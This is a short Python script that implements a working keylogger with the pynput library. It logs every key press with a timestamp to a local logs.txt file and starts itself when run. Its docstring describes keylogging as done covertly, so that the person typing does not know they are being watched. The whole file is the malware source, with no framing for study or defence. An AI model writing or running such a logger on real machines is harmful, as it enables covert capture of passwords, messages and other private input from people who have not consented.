import logging
from pynput.keyboard import Listener

def keylogger_pynput():
    """
    Keystroke logging, often referred to as keylogging or keyboard capturing, \
        is the action of recording (logging) the keys struck on a keyboard, typically covertly, \
            so that the person using the keyboard is unaware that their actions are being monitored.
    """
    log_destination= ""
    logging.basicConfig(filename = (log_destination+ "logs.txt"), \
        level = logging.DEBUG, format = '%(asctime)s : %(message)s')

    def keypress(key):
        """key press listener method"""
        logging.info(str(key))

    with Listener(on_press = keypress) as listener:
        listener.join()

keylogger_pynput()
